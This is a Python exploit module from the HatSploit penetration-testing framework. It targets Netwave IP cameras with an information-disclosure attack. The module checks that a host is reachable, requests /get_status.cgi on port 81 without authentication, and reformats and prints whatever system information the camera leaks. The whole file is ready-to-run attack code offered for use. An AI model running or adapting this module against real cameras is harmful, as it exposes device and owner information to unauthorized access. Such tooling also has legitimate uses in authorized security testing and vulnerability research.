#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.web_tools import web_tools
from utils.string_tools import string_tools

class HatSploitModule(HatSploitModule):
    web_tools = web_tools()
    string_tools = string_tools()

    details = {
        'Name': "Netwave IP Camera Information Disclosure",
        'Module': "exploit/multi/netwave_ip_camera/information_disclosure",
        'Authors': [
            'enty8080'
        ],
        'Description': "Netwave IP Camera information disclosure exploit.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 81,
            'Type': "port",
            'Required': True
        }
    }

    def print_formatted_data(self, data):
        data = data.replace(';', '')
        data = data.replace('=', ': ')

        data = data.replace('var', '=>')
        data = data.replace("'", '')

        data = data.split('\n')
        for data_type in data:
            self.badges.output_information(data_type)

    def exploit(self, remote_host, remote_port):
        target_url = self.web_tools.craft_url(remote_host, remote_port)

        if not self.web_tools.check_url_access(target_url):
            self.badges.output_error("Exploit failed!")
            return

        self.badges.output_process("Searching for information leak...")

        payload = '/get_status.cgi'
        response = self.web_tools.http_request("GET", target_url, payload)

        if response.status_code != 200:
            self.badges.output_error("No information leak found!")
            self.badges.output_error("Exploit failed!")
            return

        self.badges.output_success("Found leaked system information!")
        self.badges.output_information("Leaked system information:")
        self.print_formatted_data(response.text.strip())

    def run(self):
        remote_host, remote_port = self.parser.parse_options(self.options)

        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        self.exploit(remote_host, remote_port)
